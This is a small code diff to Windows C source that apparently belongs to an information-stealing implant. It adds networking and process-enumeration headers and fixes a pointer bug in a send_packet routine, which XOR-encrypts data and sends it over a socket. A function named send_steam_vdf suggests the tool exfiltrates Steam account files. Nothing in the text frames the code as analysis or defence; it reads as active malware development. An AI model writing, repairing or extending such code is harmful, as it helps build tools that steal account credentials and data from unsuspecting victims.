@@ -1,6 +1,11 @@
+#define WIN32_LEAN_AND_MEAN
+#define _WINSOCKAPI_   // Empêche windows.h d'inclure winsock.h
+
 #include <windows.h>
 #include <winsock2.h>
+#include <ws2tcpip.h>
 #include <winternl.h>
+#include <tlhelp32.h>  // Pour CreateToolhelp32Snapshot
 #include "common.h"
 
 #pragma comment(lib, "ws2_32.lib")
@@ -357,7 +362,7 @@ void send_steam_vdf() {
 // === NETWORK ===
 
 void send_packet(Packet* pkt) {
-    xor_crypt(pkt.data, pkt->size, g_session.key);
+    xor_crypt(pkt->data, pkt->size, g_session.key);
     send((SOCKET)g_session.socket, (char*)pkt, sizeof(unsigned char) + sizeof(unsigned short) + pkt->size, 0);
 }
 
